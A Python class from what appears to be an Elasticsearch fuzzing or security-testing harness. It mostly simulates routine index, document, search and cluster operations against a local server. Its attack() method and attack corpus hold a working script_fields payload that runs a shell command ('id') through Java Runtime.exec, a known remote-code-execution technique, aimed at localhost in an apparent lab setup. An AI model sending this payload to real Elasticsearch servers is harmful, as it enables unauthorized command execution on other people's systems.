import random
import string
from typing import Any, List
from basic.http.http_request import HTTPMethod
from basic.seed import BLANK_SEED_INPUT, SeedInput
from basic.server_state import ServerState
from example.elastic_search.api_docs.api_doc import ElasticsearchApiDoc
from example.elastic_search.tool import get_state
from interface.docable import Docable
from interface.gatherable import Gatherable


class ElasticSearchGatherable(Gatherable):
    def __init__(self, es_port: int = 50000) -> None:
        super().__init__()
        self.port: int = es_port
        self.created_indices = []  # Track created indices
        self.existing_indices = ["website", "test-index"]  # Some preset existing indices
        self.created_documents = []  # Track created documents
        self.current_index = None  # Currently operated index

    def get_final_attack_corpora(self) -> List[Any]:
        return [
            1,
            f"""import java.io.*;
                new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next();""",
        ]

    def final_attack_weight(self) -> float:
        return 0.8

    def init_seeds(self) -> SeedInput:
        return BLANK_SEED_INPUT

    def api_doc(self) -> Docable:
        return ElasticsearchApiDoc()

    def get_state(self) -> ServerState:
        return get_state("", 0)

    def attack(self):
        rsp = self.make_request(
            method=HTTPMethod.POST,
            url="http://localhost:50000/website/blog",
            json={"name": "vulhub"},
        )
        rsp = self.make_request(
            method=HTTPMethod.POST,
            url="http://localhost:50000/_search?pretty",
            json={
                "size": 1,
                "query": {"filtered": {"query": {"match_all": {}}}},
                "script_fields": {
                    "command_output": {
                        "script": f"""import java.io.*;
                new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next();"""
                    }
                },
            },
        )
        print(rsp.text)

    def run(self):
        """
        Execute one round of random ElasticSearch regular user operations.
        Simulate realistic admin behavior, including:
        - Index management: create index, get index info, delete index
        - Document operations: create document, get document, update document, delete document
        - Search operations: search documents, multi-search
        - Cluster management: get cluster health, cluster state, node info
        - Bulk operations: bulk process documents
        - Mapping management: get mapping, update mapping
        - Index maintenance: refresh, force merge
        - Alias management: create alias

        API mapping:
        - create_document: POST /${p_index}/${p_type}/ (maps to a0)
        - get_document: GET /${p_index}/${p_type}/${p_id} (maps to a1)
        - delete_document: DELETE /${p_index}/${p_type}/${p_id} (maps to a3)
        - create_index: PUT /${p_index} (maps to a4)
        - update_document: POST /${p_index}/${p_type}/${p_id}/_update (maps to a5)
        - search_documents: POST /${p_index}/_search (maps to a6)
        - delete_index: DELETE /${p_index} (maps to a7)
        - get_index_info: GET /${p_index} (maps to a8)
        - bulk_operations: POST /_bulk (maps to a9)
        - multi_search: POST /_msearch (maps to a10)
        - get_mapping: GET /${p_index}/_mapping (maps to a11)
        - update_mapping: PUT /${p_index}/_mapping/${p_type} (maps to a12)
        - refresh_index: POST /${p_index}/_refresh (maps to a13)
        - force_merge: POST /${p_index}/_forcemerge (maps to a14)
        - cluster_health: GET /_cluster/health (maps to a15)
        - cluster_state: GET /_cluster/state (maps to a16)
        - nodes_info: GET /_nodes (maps to a17)
        - index_stats: GET /${p_index}/_stats (maps to a18)
        - create_alias: POST /_aliases (maps to a19)
        """

        # Reset current operation state
        self.current_index = None

        def generate_random_name(prefix: str = "", length: int = 6) -> str:
            random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
            return f"{prefix}{random_chars}"

        def create_index():
            """Create index - corresponds to a4 in API doc"""
            index_name = generate_random_name("index_")
            print(f"Creating new index: {index_name}")

            response = self.make_request(
                HTTPMethod.PUT,
                f"http://localhost:{self.port}/{index_name}",
                json={
                    "settings": {
                        "number_of_shards": random.randint(1, 3),
                        "number_of_replicas": random.randint(0, 2)
                    },
                    "mappings": {
                        "properties": {
                            "name": {"type": "string"},
                            "status": {"type": "string"}
                        }
                    }
                }
            )

            if response:
                self.created_indices.append({
                    'name': index_name,
                    'shards': random.randint(1, 3),
                    'replicas': random.randint(0, 2)
                })
                self.current_index = index_name
                print(f"Index created successfully: {index_name}")
            else:
                print(f"Failed to create index: {index_name}")

        def get_index_info():
            """Get index info - corresponds to a8 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No available indices")
                return

            index_name = random.choice(available_indices)
            self.current_index = index_name
            print(f"Getting info for index {index_name}")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/{index_name}"
            )

            if response:
                print(f"Successfully retrieved info for index {index_name}")
            else:
                print(f"Failed to get info for index {index_name}")

        def delete_index():
            """Delete index - corresponds to a7 in API doc"""
            # Only pick from created indices to avoid deleting important presets
            if not self.created_indices:
                print("No indices to delete")
                return

            index_info = random.choice(self.created_indices)
            index_name = index_info['name']
            print(f"Deleting index: {index_name}")

            response = self.make_request(
                HTTPMethod.DELETE,
                f"http://localhost:{self.port}/{index_name}"
            )

            if response:
                self.created_indices = [idx for idx in self.created_indices if idx['name'] != index_name]
                print(f"Index deleted successfully: {index_name}")
            else:
                print(f"Failed to delete index: {index_name}")

        def create_document():
            """Create document - corresponds to a0 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No available indices to create a document")
                return

            index_name = random.choice(available_indices)
            doc_type = random.choice(["blog", "user", "product", "article"])
            doc_name = generate_random_name("doc_")
            print(f"Creating document in index {index_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/{index_name}/{doc_type}/",
                json={"name": doc_name}
            )

            if response:
                self.created_documents.append({
                    'index': index_name,
                    'type': doc_type,
                    'name': doc_name,
                    'id': response.json().get('_id') if hasattr(response, 'json') else generate_random_name("id_")
                })
                print(f"Document created successfully: {doc_name}")
            else:
                print(f"Failed to create document: {doc_name}")

        def get_document():
            """Get document - corresponds to a1 in API doc"""
            if not self.created_documents:
                print("No documents to retrieve")
                return

            doc_info = random.choice(self.created_documents)
            print(f"Getting document: {doc_info['name']}")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/{doc_info['index']}/{doc_info['type']}/{doc_info['id']}"
            )

            if response:
                print(f"Document retrieved successfully: {doc_info['name']}")
            else:
                print(f"Failed to get document: {doc_info['name']}")

        def update_document():
            """Update document - corresponds to a5 in API doc"""
            if not self.created_documents:
                print("No documents to update")
                return

            doc_info = random.choice(self.created_documents)
            new_name = generate_random_name("updated_")
            new_status = random.choice(["active", "inactive", "pending", "completed"])
            print(f"Updating document: {doc_info['name']}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/{doc_info['index']}/{doc_info['type']}/{doc_info['id']}/_update",
                json={
                    "doc": {
                        "name": new_name,
                        "status": new_status
                    }
                }
            )

            if response:
                # Update local record
                doc_info['name'] = new_name
                doc_info['status'] = new_status
                print(f"Document updated successfully: {new_name}")
            else:
                print(f"Failed to update document: {doc_info['name']}")

        def delete_document():
            """Delete document - corresponds to a3 in API doc"""
            if not self.created_documents:
                print("No documents to delete")
                return

            doc_info = random.choice(self.created_documents)
            print(f"Deleting document: {doc_info['name']}")

            response = self.make_request(
                HTTPMethod.DELETE,
                f"http://localhost:{self.port}/{doc_info['index']}/{doc_info['type']}/{doc_info['id']}"
            )

            if response:
                self.created_documents = [doc for doc in self.created_documents if doc != doc_info]
                print(f"Document deleted successfully: {doc_info['name']}")
            else:
                print(f"Failed to delete document: {doc_info['name']}")

        def search_documents():
            """Search documents - corresponds to a6 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available for search")
                return

            index_name = random.choice(available_indices)
            search_values = ["test", "example", "doc", "sample"] + [doc['name'] for doc in self.created_documents[:3]]
            search_value = random.choice(search_values)
            print(f"Searching in index {index_name}: {search_value}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/{index_name}/_search",
                json={
                    "query": {
                        "match": {
                            "name": search_value
                        }
                    }
                }
            )

            if response:
                print(f"Search completed: {search_value}")
            else:
                print(f"Search failed: {search_value}")

        def bulk_operations():
            """Bulk operations - corresponds to a9 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available for bulk operations")
                return

            index_name = random.choice(available_indices)
            doc_type = random.choice(["blog", "user", "product"])
            doc_id = generate_random_name("bulk_")
            doc_name = generate_random_name("bulk_doc_")
            print(f"Executing bulk operations on index: {index_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/_bulk",
                json=f'{{"index": {{"_index": "{index_name}", "_type": "{doc_type}", "_id": "{doc_id}"}}}}\n{{"name": "{doc_name}"}}\n'
            )

            if response:
                self.created_documents.append({
                    'index': index_name,
                    'type': doc_type,
                    'name': doc_name,
                    'id': doc_id
                })
                print(f"Bulk operation succeeded: {doc_name}")
            else:
                print("Bulk operation failed")

        def multi_search():
            """Multi-search - corresponds to a10 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available for multi-search")
                return

            index_name = random.choice(available_indices)
            print(f"Executing multi-search on index: {index_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/_msearch",
                json=f'{{"index": "{index_name}"}}\n{{"query": {{"match_all": {{}}}}}}\n'
            )

            if response:
                print(f"Multi-search completed: {index_name}")
            else:
                print(f"Multi-search failed: {index_name}")

        def get_mapping():
            """Get mapping - corresponds to a11 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available to get mapping")
                return

            index_name = random.choice(available_indices)
            print(f"Getting mapping for index {index_name}")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/{index_name}/_mapping"
            )

            if response:
                print(f"Mapping retrieved successfully: {index_name}")
            else:
                print(f"Failed to get mapping: {index_name}")

        def update_mapping():
            """Update mapping - corresponds to a12 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available to update mapping")
                return

            index_name = random.choice(available_indices)
            doc_type = random.choice(["blog", "user", "product"])
            field_types = ["string", "text", "keyword", "integer", "boolean"]
            mapping_type = random.choice(field_types)
            field_type = random.choice(field_types)
            print(f"Updating mapping for index {index_name}")

            response = self.make_request(
                HTTPMethod.PUT,
                f"http://localhost:{self.port}/{index_name}/_mapping/{doc_type}",
                json={
                    "properties": {
                        "name": {"type": mapping_type},
                        "status": {"type": field_type}
                    }
                }
            )

            if response:
                print(f"Mapping updated successfully: {index_name}")
            else:
                print(f"Failed to update mapping: {index_name}")

        def refresh_index():
            """Refresh index - corresponds to a13 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available to refresh")
                return

            index_name = random.choice(available_indices)
            print(f"Refreshing index: {index_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/{index_name}/_refresh"
            )

            if response:
                print(f"Index refreshed successfully: {index_name}")
            else:
                print(f"Failed to refresh index: {index_name}")

        def force_merge():
            """Force merge - corresponds to a14 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available for force merge")
                return

            index_name = random.choice(available_indices)
            print(f"Force merging index: {index_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/{index_name}/_forcemerge"
            )

            if response:
                print(f"Force merge succeeded: {index_name}")
            else:
                print(f"Force merge failed: {index_name}")

        def cluster_health():
            """Get cluster health - corresponds to a15 in API doc"""
            print("Getting cluster health")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/_cluster/health"
            )

            if response:
                print("Cluster health retrieved successfully")
            else:
                print("Failed to get cluster health")

        def cluster_state():
            """Get cluster state - corresponds to a16 in API doc"""
            print("Getting cluster state")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/_cluster/state"
            )

            if response:
                print("Cluster state retrieved successfully")
            else:
                print("Failed to get cluster state")

        def nodes_info():
            """Get nodes info - corresponds to a17 in API doc"""
            print("Getting nodes info")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/_nodes"
            )

            if response:
                print("Nodes info retrieved successfully")
            else:
                print("Failed to get nodes info")

        def index_stats():
            """Get index statistics - corresponds to a18 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available to get statistics")
                return

            index_name = random.choice(available_indices)
            print(f"Getting stats for index {index_name}")

            response = self.make_request(
                HTTPMethod.GET,
                f"http://localhost:{self.port}/{index_name}/_stats"
            )

            if response:
                print(f"Index stats retrieved successfully: {index_name}")
            else:
                print(f"Failed to get index stats: {index_name}")

        def create_alias():
            """Create alias - corresponds to a19 in API doc"""
            available_indices = self.existing_indices + [idx['name'] for idx in self.created_indices]
            if not available_indices:
                print("No indices available to create alias")
                return

            index_name = random.choice(available_indices)
            alias_name = generate_random_name("alias_")
            print(f"Creating alias for index {index_name}: {alias_name}")

            response = self.make_request(
                HTTPMethod.POST,
                f"http://localhost:{self.port}/_aliases",
                json={
                    "actions": [
                        {
                            "add": {
                                "index": index_name,
                                "alias": alias_name
                            }
                        }
                    ]
                }
            )

            if response:
                print(f"Alias created successfully: {alias_name} -> {index_name}")
            else:
                print(f"Failed to create alias: {alias_name}")

        # Define all available operation functions
        operations = [
            create_index,
            get_index_info,
            create_document,
            get_document,
            update_document,
            delete_document,
            search_documents,
            bulk_operations,
            multi_search,
            get_mapping,
            update_mapping,
            refresh_index,
            force_merge,
            cluster_health,
            cluster_state,
            nodes_info,
            index_stats,
            create_alias,
            delete_index  # Deletion placed last to reduce selection probability
        ]

        try:
            # Randomly choose and execute one operation
            operation = random.choice(operations)
            operation()

        except Exception as e:
            print(f"Error occurred while executing operation: {e}")


es = ElasticSearchGatherable()
es.generate(16)
